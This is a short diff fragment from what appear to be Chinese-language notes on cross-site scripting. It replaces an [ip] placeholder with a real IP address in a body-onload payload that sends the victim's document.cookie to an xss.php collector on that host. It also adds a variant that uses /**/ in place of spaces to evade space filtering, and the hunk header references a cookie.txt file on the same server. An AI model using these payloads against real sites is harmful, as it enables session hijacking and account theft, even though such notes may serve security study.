@@ -37,13 +37,16 @@ http://106.53.207.220/cookie.txt
 
 
 ````
-<body onload="document.location.href='http://[ip]/xss.php?xss='+document.cookie"></body>
+<body onload="document.location.href='http://106.53.207.220/xss.php?xss='+document.cookie"></body>
 
 ````
 
+* 过滤空格(使用tab、/**/来绕过)
 
+````
+<body/**/onload="document.location.href='http://106.53.207.220/xss.php?xss='+document.cookie"></body>
 
-
+````
 
 
 
